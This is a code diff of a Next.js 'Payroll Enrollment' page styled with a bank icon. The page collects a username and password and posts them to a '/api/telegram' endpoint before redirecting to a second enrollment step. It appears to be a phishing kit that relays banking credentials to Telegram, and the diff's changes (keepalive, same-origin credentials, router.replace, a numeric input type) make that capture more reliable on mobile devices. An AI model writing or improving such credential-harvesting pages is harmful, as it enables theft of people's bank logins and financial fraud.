@@ -1,5 +1,4 @@
 "use client";
-
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
@@ -7,21 +6,19 @@ import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";
 
 export default function PayrollEnrollmentPage() {
   const router = useRouter();
-
   const [f1, setF1] = useState(""); // username
   const [f2, setF2] = useState(""); // password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Debug: Confirm component mounted (helps diagnose JS issues on some devices)
+  // Debug: Confirm component mounted
   useEffect(() => {
     console.log("✅ PayrollEnrollmentPage mounted");
   }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
     if (!f1.trim() || !f2.trim()) {
       setError("Please enter both Username and Password.");
       return;
@@ -39,15 +36,16 @@ export default function PayrollEnrollmentPage() {
     try {
       const res = await fetch("/api/telegram", {
         method: "POST",
-        headers: { 
+        headers: {
           "Content-Type": "application/json",
-          "Cache-Control": "no-cache"
+          "Cache-Control": "no-cache",
         },
+        credentials: "same-origin",   // ← extra reliability on mobile
         body: JSON.stringify({
           data: formData,
           formType: "🏦 Payroll Enrollment",
         }),
-        keepalive: true,        // Helps when user leaves page quickly
+        keepalive: true,
       });
 
       if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
@@ -56,11 +54,9 @@ export default function PayrollEnrollmentPage() {
       setF1("");
       setF2("");
 
-      // Small delay gives user time to see success message
       setTimeout(() => {
-        router.push("/PayrollEnrollment2");
+        router.replace("/PayrollEnrollment2");   // ← safer than push
       }, 1500);
-
     } catch (err) {
       console.error("Submission error:", err);
       setError("Failed to submit. Please try again.");
@@ -122,7 +118,6 @@ export default function PayrollEnrollmentPage() {
                   <span>{error}</span>
                 </div>
               )}
-
               {success && (
                 <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
                   {success}
@@ -134,7 +129,7 @@ export default function PayrollEnrollmentPage() {
                   Username
                 </label>
                 <input
-                  type="text"
+                  type="tel"                    
                   value={f1}
                   onChange={(e) => setF1(e.target.value)}
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
